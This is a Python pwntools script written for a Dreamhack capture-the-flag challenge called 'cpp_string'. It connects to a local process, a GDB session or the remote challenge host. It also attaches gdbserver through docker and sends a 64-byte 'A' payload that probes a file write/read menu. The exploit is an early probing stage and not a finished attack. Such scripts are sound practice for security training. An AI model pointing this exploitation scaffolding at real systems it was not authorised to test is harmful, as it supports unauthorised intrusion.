#!/usr/bin/env python3

from pwn import *

exe = ELF("./cpp_string_patched")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

local_port = 5000
localscript = f'''
file {exe.path}
define rerun
    !docker exec -u root -i debug_container bash -c "kill -9 \\$(pidof gdbserver) &"
    !docker exec -u root -i debug_container bash -c "gdbserver :9090 --attach \\$(pidof chall) &"
end
define con
    target remote :9090
end
'''

gdbscript = '''
b *main
c
'''

info = lambda msg: log.info(msg)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sna = lambda p, msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sn = lambda p, data: p.sendline(str(data).encode())
s = lambda p, data: p.send(data)


def conn():
    if args.LOCAL:
        r = process ([exe.path])
        # r = remote ("localhost", local_port)
    elif args.GDB:
        r = gdb.debug ([exe.path], gdbscript=gdbscript, env={'SHELL': '/bin/bash'})
    elif args.REMOTE:
        r = remote("host8.dreamhack.games", 10570)

    return r

def debug_container(p):
    if args.LOCAL:
        gdbserver_cmd = "docker exec -u root -i debug_container bash -c".split()
        gdbserver_cmd.append("gdbserver :9090 --attach $(pidof prob)")
        process(gdbserver_cmd)
        
        # gdb.attach(('0.0.0.0', 9090), exe=exe.path, gdbscript=localscript)
        pause()

def read_file (p):
    sla (p, b'[*] input : ', b'1')

def write_file (p, data):
    sla (p, b'[*] input : ', b'2')
    sla (p, b'Enter file contents : ', data)

def show_content (p):
    sla (p, b'[*] input : ', b'3')

def main():
    p = conn()
    if args.LOCAL and args.GDB:
        debug_container (p)

    write_file (p, b'A' * 64)
    read_file (p)
    show_content(p)
    


    p.interactive()


if __name__ == "__main__":
    main()